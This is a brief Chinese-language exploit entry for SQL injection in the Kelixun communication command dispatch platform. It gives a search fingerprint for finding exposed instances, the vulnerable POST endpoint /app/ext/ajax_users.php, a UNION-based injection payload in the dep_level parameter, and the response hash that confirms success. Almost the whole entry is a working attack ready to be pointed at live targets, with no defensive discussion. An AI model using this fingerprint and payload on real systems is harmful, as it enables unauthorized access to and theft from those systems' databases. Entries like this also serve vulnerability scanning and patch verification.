# 科立迅通信指挥调度平台-SQL注入-ajax

科立迅通信指挥调度平台 ｜ SQL注入 ｜ —
- **指纹**：`body="app/structure/departments.php"`
- **请求**：`POST /app/ext/ajax_users.php HTTP/1.1`

**Payload**
```
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
```
- **响应特征**：200 e10adc3949ba59abbe56e057f20f883e